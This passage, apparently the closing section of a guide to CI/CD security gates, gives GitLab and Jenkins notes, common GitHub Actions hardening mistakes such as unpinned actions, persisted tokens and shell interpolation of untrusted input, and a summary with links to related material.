Two GitLab-specific notes. The `artifacts:reports:container_scanning` and `dependency_scanning` report types expect GitLab's own JSON schema, so plain Trivy or OSV-Scanner JSON is ignored there; Trivy ships a `contrib/gitlab.tpl` template that produces the right format. And the vulnerability gate from part 2 runs unchanged in any image that has `bash`, `curl`, `jq`, `osv-scanner` and `conftest`.

For Jenkins or any other CI system, the simplest start is the `scripts/gates.sh` script from the [overview](/guides/security-gates): call it from one `sh` step and archive `findings.json` and `checkov.json` as build artifacts.

## Common Mistakes

- **Referencing actions by tag or branch.** Tags moved in the March 2026 Trivy and KICS attacks. Pin SHAs and let Dependabot update them.
- **Letting the scanners decide.** Exit codes of different tools mean different things. Run them in report mode and let one reviewed policy per gate decide.
- **Granting `write-all` permissions** or leaving the default token permissions. Set `permissions: contents: read` at the top and add what each job needs.
- **Leaving the token behind.** Without `persist-credentials: false`, `actions/checkout` keeps the token configured for `git` for the rest of the job (since v6 in a file under `$RUNNER_TEMP`, before that in `.git/config`), so every later step, including a compromised tool, can use it.
- **Interpolating untrusted input into `run:`.** Pull request titles, branch names and commit messages can contain shell code. Use environment variables.
- **Verifying signatures without pinning the identity.** "Signed" is not enough; check which workflow signed it, from which ref.
- **Gates nobody is required to pass.** Make the jobs and code scanning results required in the branch rulesets, or the gates are only advice.

## Summary

- Run the quick gates (secrets, SAST, policy, vulnerabilities, compliance) in parallel on every pull request, and build only when they pass.
- Pin every action and image to a SHA or digest, update the pins with Dependabot, and verify the binaries you download by checksum and signature.
- Check the workflow itself with actionlint and zizmor.
- Send results to annotations and code scanning, and make them binding with rulesets.
- Attest provenance and SBOMs on `main`, and verify them before deploying and at admission.

You now have the complete set: [policy as code](/guides/security-gates/01-policy-as-code), [vulnerability gates](/guides/security-gates/02-vulnerability-gates), [compliance gates](/guides/security-gates/03-compliance-gates) and the pipeline that runs them. Go back to the [overview](/guides/security-gates) for the rollout plan.

## Keep Learning

- [The pwn request just got harder: what actions/checkout v7 changes, and what it does not](/posts/pwn-request-github-actions-checkout-v7)
- [CI/CD Pipeline Hardening: A Practical Guide to Securing Your Build Infrastructure](/posts/cicd-pipeline-hardening-guide)
- [Software Supply Chain Security: SBOMs, Sigstore, and SLSA in Practice](/posts/software-supply-chain-security)
- [GitHub Actions Workflows Quiz](/quizzes/github-actions-quiz) and [Complete CI/CD Pipeline with GitHub Actions](/exercises/ci-cd-github-actions) (exercise)
- [Interview question: CI/CD pipeline design](/interview-questions/mid/cicd-pipeline-design)
